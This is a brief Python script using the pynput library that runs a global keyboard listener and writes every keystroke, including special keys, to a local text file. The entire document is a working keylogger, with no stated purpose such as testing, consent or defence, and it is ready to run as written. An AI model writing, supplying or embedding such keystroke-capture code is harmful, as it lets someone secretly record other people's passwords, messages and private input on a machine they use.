from pynput import keyboard

log_file = "keystrokes_saved.txt"

def on_key_press(key):
    try:
        with open(log_file, 'a') as f:
            if hasattr(key, 'char') and key.char:
                # Log regular character keys
                f.write(f"{key.char}\n")
            else:
                # Log special keys (Ctrl, Shift, Esc, etc.)
                f.write(f"{key}\n")
    
    except Exception as e:
        print(f"Error logging key press: {e}")

with keyboard.Listener(on_press=on_key_press) as listener:
    listener.join()
